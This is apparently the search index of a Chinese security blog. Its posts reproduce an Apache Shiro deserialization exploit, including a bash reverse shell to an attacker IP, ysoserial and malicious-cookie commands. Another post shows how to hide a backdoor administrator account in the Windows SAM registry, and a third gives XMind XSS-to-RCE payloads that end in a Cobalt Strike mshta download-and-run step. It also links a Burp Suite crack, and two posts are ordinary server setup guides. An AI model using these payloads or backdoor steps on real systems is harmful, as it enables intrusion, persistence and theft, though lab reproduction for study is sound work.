<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>apache shiro 反序列化复现</title>
      <link href="/posts/af27.html"/>
      <url>/posts/af27.html</url>
      
        <content type="html"><![CDATA[<p>靶场搭建</p><pre class=" language-sh"><code class="language-sh">docker pull medicean/vulapps:s_shiro_1    #获取docker镜像systemctl restart docker        #重启dockerdocker run -d -p 8082:8080 medicean/vulapps:s_shiro_1   #启动docker镜像访问靶机的8082端口即可</code></pre><p>环境</p><p>靶机：192.168.3.125</p><p>攻击机：192.168.3.118</p><p>工具：</p><p>ysoserial.jar</p><p>exp.py</p><p>nc</p><p>ShiroExploit.V2.0</p><p>我们访问192.168.3.125:8082输入用户名密码（随便输入）并且勾选上remember me利用burp抓包</p><p>![](../images/apache shiro反序列化/1.png)</p><p>我们看响应包发现rememberMe=deleteMe由此证明存在shiro反序列化漏洞</p><p>![](../images/apache shiro反序列化/2.png)</p><h3 id="我们首先利用纯手工实现shiro序列化反弹shell"><a href="#我们首先利用纯手工实现shiro序列化反弹shell" class="headerlink" title="我们首先利用纯手工实现shiro序列化反弹shell"></a>我们首先利用纯手工实现shiro序列化反弹shell</h3><h4 id="1-制作反弹shell代码"><a href="#1-制作反弹shell代码" class="headerlink" title="1.制作反弹shell代码"></a>1.制作反弹shell代码</h4><p>我们先生成初始反弹shell代码</p><pre class=" language-sh"><code class="language-sh">bash -i >& /dev/tcp/192.168.3.118/888 0>&1</code></pre><p>接着我们在<a href="http://www.jackson-t.ca/runtime-exec-payloads.html%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81">http://www.jackson-t.ca/runtime-exec-payloads.html进行编码</a></p><p>![](../images/apache shiro反序列化/3.png)</p><h4 id="2-使用ysoserial中JRMP监听模块，监听666端口"><a href="#2-使用ysoserial中JRMP监听模块，监听666端口" class="headerlink" title="2.使用ysoserial中JRMP监听模块，监听666端口"></a>2.使用ysoserial中JRMP监听模块，监听666端口</h4><p>进入ysoserial.jar所在目录，执行以下代码，监听666端口</p><pre class=" language-sh"><code class="language-sh">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 666 CommonsCollections4 '编码内容'</code></pre><p>编码内容是刚刚编码之后的代码也就是</p><pre class=" language-sh"><code class="language-sh">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTE4Lzg4OCAwPiYx}|{base64,-d}|{bash,-i}</code></pre><p>此时我们完整的执行代码就是</p><pre class=" language-sh"><code class="language-sh">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTE4Lzg4OCAwPiYx}|{base64,-d}|{bash,-i}'</code></pre><p>![](../images/apache shiro反序列化/4.png)</p><h4 id="3-生成cookie"><a href="#3-生成cookie" class="headerlink" title="3.生成cookie"></a>3.生成cookie</h4><p>前提：我们python必须安装了pycrypto库。没安装的可以执行以下命令安装</p><pre class=" language-python"><code class="language-python">pip install pycrypto</code></pre><p>我们执行如下代码即可生成包含攻击代码的cookie</p><pre class=" language-sh"><code class="language-sh">python exp.py 攻击者ip:ysoserial监听的端口</code></pre><p>此时我们的攻击机执行的代码是</p><pre class=" language-sh"><code class="language-sh">python exp.py 192.168.3.118:666</code></pre><p>![](../images/apache shiro反序列化/5.png)</p><p>我们可以看见此时已经生成了含有攻击代码的cookie</p><h4 id="4-nc监听，burp修改cookie"><a href="#4-nc监听，burp修改cookie" class="headerlink" title="4.nc监听，burp修改cookie"></a>4.nc监听，burp修改cookie</h4><p>我们利用nc开始监听我们最初反弹shell的端口</p><pre class=" language-sh"><code class="language-sh">nc -lvvp 888</code></pre><p>接着我们利用burp修改cookie![](../images/apache shiro反序列化/6.png)</p><p>最后发包就可以成功反弹shell</p><p>![](../images/apache shiro反序列化/7.png)</p><h3 id="我们接下来使用工具自动化完成shiro反序列化利用"><a href="#我们接下来使用工具自动化完成shiro反序列化利用" class="headerlink" title="我们接下来使用工具自动化完成shiro反序列化利用"></a>我们接下来使用工具自动化完成shiro反序列化利用</h3><p>我们使用ShiroExploit.V2.0，双击ShiroExploit.jar打开工具</p><p>![](../images/apache shiro反序列化/8.png)</p><p>我们在url处输入存在shiro反序列化漏洞的url地址，选择命令执行。不断切换我们的列（PAYLOAD）尝试哪个payload可以利用，最后我们输入我们要执行的命令即可进行远程命令执行。</p><p>这里我环境的payload是CommonsCollections2</p><p>![](../images/apache shiro反序列化/9.png)</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows建立隐藏用户远程连接</title>
      <link href="/posts/ca44.html"/>
      <url>/posts/ca44.html</url>
      
        <content type="html"><![CDATA[<p>前言：迷迷糊糊记得通过net user aaa$ /add可以隐藏windows账户，但是这个隐藏只能在命令行中隐藏在本地用户和组中暴露无遗，于是就想着如何在计算机管理中也隐藏账户。</p><h2 id="注册表隐藏账户"><a href="#注册表隐藏账户" class="headerlink" title="注册表隐藏账户"></a>注册表隐藏账户</h2><h3 id="1-赋予管理员注册表操作权限"><a href="#1-赋予管理员注册表操作权限" class="headerlink" title="1.赋予管理员注册表操作权限"></a>1.赋予管理员注册表操作权限</h3><p>我们打开注册表来到“HKEY_LOCAL_MACHINE\SAM\SAM”处我们发现我们展开其中的键值也无法进行修改。这时我们需要给当前管理员账户注册表的操作权限。左上角编辑–&gt;权限–&gt;选中你想赋予权限的用户–&gt;在完全控制上打勾–&gt;确定。</p><p><img src="../images/Windows%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/1.png"></p><p>这样我们就可以展开并且修改SAM下的键值了。</p><p><img src="../images/Windows%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/2.png"></p><h3 id="2-将隐藏账户替换为管理员"><a href="#2-将隐藏账户替换为管理员" class="headerlink" title="2.将隐藏账户替换为管理员"></a>2.将隐藏账户替换为管理员</h3><p>来到注册表编辑器的”HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，当前系统中所有存在的账户都会在这里显示，当然也包括我们先前通过net user aaa$ /add添加的隐藏账户。</p><p><img src="../images/Windows%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/3.png"></p><p>我们查看它的值为“0x3ea”和前面users中000003EA相对应。（Administrator的值为”0x1f4”）。我们将aaa$导出为aaa$.reg。将aaa$对应的000003EA导出为user.reg，将000001F4导出为admin.reg。然后我们将admin.reg中F后面的值（图片中我标蓝的）复制到user.reg保存。我们先将我们建立的隐藏账户aaa$删除然后将user.reg和aaa$.reg导入注册表。这个时候我们就成功将隐藏彰化替换为管理员账户了。</p><p><img src="../images/Windows%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/4.png"></p><p>此时我们在cmd以及本地用户和组中都无法发现我们的隐藏账户aaa$但是在注册表中可以看见，于是我们就可以将先前赋予管理员注册表中SUM的操作权限删除。</p><h3 id="3-取消先前赋予管理员的注册表权限"><a href="#3-取消先前赋予管理员的注册表权限" class="headerlink" title="3.取消先前赋予管理员的注册表权限"></a>3.取消先前赋予管理员的注册表权限</h3><p>老规矩，来到“HKEY_LOCAL_MACHINE\SAM\SAM”处，左上角编辑–&gt;权限–&gt;选中你想赋予权限的用户–&gt;全部选择拒绝。这样当真正的管理员想对”HKEY_LOCAL_MACHINE\SAM\SAM”下面的项进行操作的时候将会发生错误。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows后门 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows安装破解bupr2021</title>
      <link href="/posts/23801.html"/>
      <url>/posts/23801.html</url>
      
        <content type="html"><![CDATA[<p>jdk我用的是11版本：<a href="https://www.oracle.com/java/technologies/javase-jdk11-downloads.html">https://www.oracle.com/java/technologies/javase-jdk11-downloads.html</a></p><p>burpsuite破解工具：<a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases">https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases</a></p><p>官网下载burpsuite 2021.6：<a href="https://portswigger.net/burp/releases">https://portswigger.net/burp/releases</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 工具安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7部署PHP+Mysql+Apache</title>
      <link href="/posts/38006.html"/>
      <url>/posts/38006.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-利用lanmp包一键安装"><a href="#1-利用lanmp包一键安装" class="headerlink" title="1.利用lanmp包一键安装"></a>1.利用lanmp包一键安装</h2><h3 id="（1）先安装lanmp包"><a href="#（1）先安装lanmp包" class="headerlink" title="（1）先安装lanmp包"></a>（1）先安装lanmp包</h3><pre class=" language-shell"><code class="language-shell">wget http://dl.wdlinux.cn/files/lanmp_v3.tar.gz</code></pre><p>接着我们通过ll指令检查lanmp包是否安装成功</p><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/1.png"></p><h3 id="（2）解压缩lanmp安装包"><a href="#（2）解压缩lanmp安装包" class="headerlink" title="（2）解压缩lanmp安装包"></a>（2）解压缩lanmp安装包</h3><pre class=" language-shell"><code class="language-shell">tar -zxvf lanmp_v3.tar.gz </code></pre><h3 id="（3）执行shell脚本一键安装，选择你所要安装的web服务类型"><a href="#（3）执行shell脚本一键安装，选择你所要安装的web服务类型" class="headerlink" title="（3）执行shell脚本一键安装，选择你所要安装的web服务类型"></a>（3）执行shell脚本一键安装，选择你所要安装的web服务类型</h3><pre class=" language-shell"><code class="language-shell"> sh lanmp.sh </code></pre><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/2.png"></p><p>这里有五个选项，选择你想要安装的服务</p><p>1.apache+php+mysql组合</p><p>2.nginx+php+mysql组合</p><p>3.nginx+apache+php+mysql组合</p><p>4.安装所有的服务</p><p>5.目前不安装</p><p>我自己安装的apahce+php+mysql组合，所以我输入1。这个就根据每个人的选择来定。</p><p>接下来就会执行脚本进行安装，我们只需要默默等待就可以了。</p><h3 id="（4）安装成功后，我们进入服务器的8080端口进入控制台"><a href="#（4）安装成功后，我们进入服务器的8080端口进入控制台" class="headerlink" title="（4）安装成功后，我们进入服务器的8080端口进入控制台"></a>（4）安装成功后，我们进入服务器的8080端口进入控制台</h3><p>默认账号是admin，密码是wdlinux.cn</p><p>特别注意：像国内的腾某云以及阿某云都存在着自身的安全组策略，会对端口进出有所限制，所以我们需要手动放通端口</p><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/3.png"></p><p>接着我们访问我们服务器的8080端口，到达登陆界面</p><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/4.png"></p><p>输入默认用户名：admin 以及默认密码：wdlinux.cn进入控制面板</p><h2 id="2-直接安装apache-mysql-php"><a href="#2-直接安装apache-mysql-php" class="headerlink" title="2.直接安装apache+mysql+php"></a>2.直接安装apache+mysql+php</h2><h3 id="（1）安装apache"><a href="#（1）安装apache" class="headerlink" title="（1）安装apache"></a>（1）安装apache</h3><p>第一步：</p><p>安装apache服务程序（apache的软件包名叫httpd）</p><pre class=" language-shell"><code class="language-shell">yum install httpd -y</code></pre><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/5.png"></p><p>第二步：</p><p>开启apache服务并将apache服务添加到开机自启动中</p><pre class=" language-shell"><code class="language-shell">systemctl start httpdsystemctl enable httpd</code></pre><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/6.png"></p><p>下面介绍几个配置目录位置：</p><p>网站数据目录：/var/www/html</p><p>配置文件目录：/etc/httpd/conf/httpd.conf</p><p>访问日志：/var/log/httpd/access_log</p><p>错误日志：/var/log/httpd/error_log</p><p>第三步：测试apache服务是否正常</p><p>在自己网站数据目录的index.html中输入Hello World通过浏览器访问服务器查看显示是否为index.html内容</p><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/7.png"></p><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/8.png"></p><h3 id="（2）安装mysql服务（5-7-14）"><a href="#（2）安装mysql服务（5-7-14）" class="headerlink" title="（2）安装mysql服务（5.7.14）"></a>（2）安装mysql服务（5.7.14）</h3><p>第一步：安装MySQL官方的yum repository</p><pre class=" language-shell"><code class="language-shell">yum -y install mysql57-community-release-el7-10.noarch.rpm</code></pre><p>如果发现一下报错</p><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/9.png"></p><p>这就说明我们本地yum仓库中没有可用的mysql-server rpm包。这时可执行以下命令：</p><pre class=" language-shell"><code class="language-shell">wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</code></pre><p>第二步：安装MySQL服务</p><pre class=" language-shell"><code class="language-shell">yum -y install mysql-community-server</code></pre><p>第三步：启动MySQL，修改密码</p><pre class=" language-shell"><code class="language-shell">systemctl start mysqld.service</code></pre><p>启动完成后查看mysql运行状态：</p><pre class=" language-shell"><code class="language-shell">systemctl status mysqld.service</code></pre><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/10.png"></p><p>发现在正常运行以后我们就要登陆到数据中，但是我们不知道root密码，我们需要使用如下命令在日志中找到root用户初始密码</p><pre class=" language-shell"><code class="language-shell">grep "password" /var/log/mysqld.log</code></pre><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/11.png"></p><p>接着我们登录mysql数据库：</p><pre class=" language-mysql"><code class="language-mysql">mysql -uroot -p</code></pre><p>输入我们刚才在日志中所查看到的root密码（这里输入是没有任何显示的）</p><p>登录数据库后我们使用如下命令修改root密码：</p><pre class=" language-mysql"><code class="language-mysql">ALTER USER 'root'@'localhost' IDENTIFIED BY 'new password';</code></pre><p>new password处填入你的新密码</p><p>可能会出现如下报错</p><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/12.png"></p><p>这是由于我们设置的密码复杂度不符合默认规定，我们可以通过修改密码复杂度要求来解决报错</p><p>降低密码复杂度要求：</p><pre class=" language-mysql"><code class="language-mysql">set global validate_password_policy=LOW;</code></pre><p>修改密码默认长度：</p><pre class=" language-mysql"><code class="language-mysql">set global validate_password_length=6;</code></pre><p>注意：这里我们是将密码长度要去设置为6的</p><p>查看密码复杂度指令：</p><pre class=" language-mysql"><code class="language-mysql">SHOW VARIABLES LIKE 'validate_password%';</code></pre><h3 id="（3）安装php"><a href="#（3）安装php" class="headerlink" title="（3）安装php"></a>（3）安装php</h3><p>第一步：安装php服务</p><pre class=" language-shell"><code class="language-shell">yum -y install php</code></pre><p>第二步：测试php是否安装成功</p><p>进入到我们网站的根目录，删除index.htm我们新建一个index.php输入查看php版本信息代码，通过浏览器打开网站看看是否能显示php版本信息</p><p>删除index.html：</p><pre class=" language-shell"><code class="language-shell">rm -rf index.html</code></pre><p>新建index.php：</p><pre class=" language-shell"><code class="language-shell">touch index.php</code></pre><p>编辑index.php写入显示版本信息代码：</p><pre class=" language-shell"><code class="language-shell">vim index.php</code></pre><p>按i进入输入模式，接着输入如下代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>然后按esc接着按冒号，然后输入wq（保存并退出）</p><p>接着重启apache服务，访问index.php看浏览器是否能够显示php版本信息</p><p><img src="../images/Centos7%E9%83%A8%E7%BD%B2PHP-Mysql-Apache/13.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 环境搭建 </tag>
            
            <tag> 网页服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMind思维导图XSS漏洞复现</title>
      <link href="/posts/7225.html"/>
      <url>/posts/7225.html</url>
      
        <content type="html"><![CDATA[<p><strong>简介</strong>：XMind 是一个全功能的思维导图和头脑风暴软件，为激发灵感和创意而生。作为一款有效提升工作和生活效率的生产力工具，受到全球百千万用户的青睐。近期各大公众号平台曝出XMind xss存在远程执行RCE漏洞，我也是今天进行了漏洞复现。</p><p><strong>环境</strong>：XMind-2020-for-Windows-64bit-10.3.1-202101070032.exe</p><p><strong>复现</strong>：</p><h2 id="1-打开XMind新建思维导图，进入大纲，测试基本xss代码。"><a href="#1-打开XMind新建思维导图，进入大纲，测试基本xss代码。" class="headerlink" title="1.打开XMind新建思维导图，进入大纲，测试基本xss代码。"></a>1.打开XMind新建思维导图，进入大纲，测试基本xss代码。</h2><p>payload：</p><pre class=" language-html"><code class="language-html">&lt;img src=# onerror=alert('1')></code></pre><p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p><p><strong>注意</strong>：执行代码时，将光标放到语句最后，按空间键或者CTRL触发XSS执行</p><h2 id="2-测试RCE命令，我们通过打开计算器来展示。"><a href="#2-测试RCE命令，我们通过打开计算器来展示。" class="headerlink" title="2.测试RCE命令，我们通过打开计算器来展示。"></a>2.测试RCE命令，我们通过打开计算器来展示。</h2><p>payload：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>require(<span class="token punctuation">'</span>child_process<span class="token punctuation">'</span>).exec(<span class="token punctuation">'</span>calc.exe<span class="token punctuation">'</span>,null);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p><h2 id="3-接着我们构造payload来查看我们相关配置，这里我们查看网络设置"><a href="#3-接着我们构造payload来查看我们相关配置，这里我们查看网络设置" class="headerlink" title="3.接着我们构造payload来查看我们相关配置，这里我们查看网络设置"></a>3.接着我们构造payload来查看我们相关配置，这里我们查看网络设置</h2><p>payload：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs<span class="token punctuation">=</span>`,`base64`).toString())<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></code></pre><pre class=" language-markdown"><code class="language-markdown">cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=</code></pre><p>经过base64解码是：</p><pre class=" language-markdown"><code class="language-markdown">require('child_process').exec('ipconfig /all',(error, stdout, stderr)=>{    alert(<span class="token code keyword">`stdout: ${stdout}`</span>);  });</code></pre><p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p><h2 id="4-上线CobaltStrike"><a href="#4-上线CobaltStrike" class="headerlink" title="4.上线CobaltStrike"></a>4.上线CobaltStrike</h2><p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p><p>（1）首先我们生成一个powershell command的payload</p><p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p><p>（2）接着我们利用cs的远程文件下载模块编辑远程下载url</p><p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p><p> 生成的url为：</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//你设置的监听器IP:80/download/file.ext</code></pre><p>接下来我们只要执行如下代码就可以上线cs，其中mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p><pre class=" language-http"><code class="language-http">mshta http://你设置的监听器IP:80/download/file.ext</code></pre><p>（3）接着我们构造执行的XSS代码</p><p>原始攻击payload：</p><pre class=" language-html"><code class="language-html">&lt;img src=# onerror='eval(new Buffer(`require('child_process').exec('command',(error, stdout, stderr)=>{    alert(`stdout: ${stdout}`); });`,`base64`).toString())'></code></pre><p>其中我们可以在command处进行目录执行，我们就将我们的cs执行码输入进去，但是要记得用base64进行编码</p><p>接着我们就看到cs上线成功</p><p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7服务器安装java环境</title>
      <link href="/posts/62838.html"/>
      <url>/posts/62838.html</url>
      
        <content type="html"><![CDATA[<p>前言：最近看到阿里云主机有新人优惠，嘿嘿。我就注册了一个新的账号，买了一台，然后开始安装我们的各种工具。但是，安装工具时发现java环境没有装，于是我就开始我的安装之旅。</p><h2 id="1-打开url选择jdk1-8下载"><a href="#1-打开url选择jdk1-8下载" class="headerlink" title="1.打开url选择jdk1.8下载"></a>1.打开url选择jdk1.8下载</h2><p>[<a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html]">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html]</a></p><p>我选择Linux x64的版本：</p><p><img src="../images/centos7%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85java%E7%8E%AF%E5%A2%83/1.png"></p><h2 id="2-下载"><a href="#2-下载" class="headerlink" title="2.下载"></a>2.下载</h2><p>这里你可以选择在服务器中直接使用命令：</p><pre class=" language-shell"><code class="language-shell">wget https://download.oracle.com/otn/java/jdk/8u291-b10/d7fc238d0cbf4b0dac67be84580cfb4b/jdk-8u291-linux-x64.tar.gz</code></pre><p>当然了你也可以将压缩包下载到本地利用finalshell进行上传</p><p><img src="../images/centos7%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85java%E7%8E%AF%E5%A2%83/2.png"></p><p>下载之后通过命令核对安装包大小是否符合</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ls</span> -lht</code></pre><h2 id="3-安装"><a href="#3-安装" class="headerlink" title="3.安装"></a>3.安装</h2><h3 id="（1）首先创建安装目录"><a href="#（1）首先创建安装目录" class="headerlink" title="（1）首先创建安装目录"></a>（1）首先创建安装目录</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> /usr/local/java/</code></pre><h3 id="（2）然后将下载下来的压缩包解压到安装目录"><a href="#（2）然后将下载下来的压缩包解压到安装目录" class="headerlink" title="（2）然后将下载下来的压缩包解压到安装目录"></a>（2）然后将下载下来的压缩包解压到安装目录</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf jdk-8u291-linux-x64.tar.gz -C /usr/local/java</code></pre><p>注意：这里的-C是指定压缩目录</p><h2 id="4-设置环境变量"><a href="#4-设置环境变量" class="headerlink" title="4.设置环境变量"></a>4.设置环境变量</h2><h3 id="（1）打开文件"><a href="#（1）打开文件" class="headerlink" title="（1）打开文件"></a>（1）打开文件</h3><pre class=" language-bash"><code class="language-bash">vim /etc/profile</code></pre><h3 id="（2）shift-g进入文末，按i进入编辑模式，在最后一行开始添加"><a href="#（2）shift-g进入文末，按i进入编辑模式，在最后一行开始添加" class="headerlink" title="（2）shift+g进入文末，按i进入编辑模式，在最后一行开始添加"></a>（2）shift+g进入文末，按i进入编辑模式，在最后一行开始添加</h3><pre class=" language-shell"><code class="language-shell">export JAVA_HOME=/usr/local/java/jdk1.8.0_291export JRE_HOME=${JAVA_HOME}/jreexport CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/libexport PATH=${JAVA_HOME}/bin:$PATH</code></pre><h3 id="（3）使得环境变量生效"><a href="#（3）使得环境变量生效" class="headerlink" title="（3）使得环境变量生效"></a>（3）使得环境变量生效</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile</code></pre><h3 id="（4）添加软连接（快捷方式）"><a href="#（4）添加软连接（快捷方式）" class="headerlink" title="（4）添加软连接（快捷方式）"></a>（4）添加软连接（快捷方式）</h3><pre class=" language-shell"><code class="language-shell">ln -s /usr/local/java/jdk1.8.0_291/bin/java /usr/bin/java</code></pre><h2 id="5-检查"><a href="#5-检查" class="headerlink" title="5.检查"></a>5.检查</h2><pre class=" language-shell"><code class="language-shell">java -version</code></pre><p><img src="../images/centos7%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85java%E7%8E%AF%E5%A2%83/3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 菜鸡日常 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
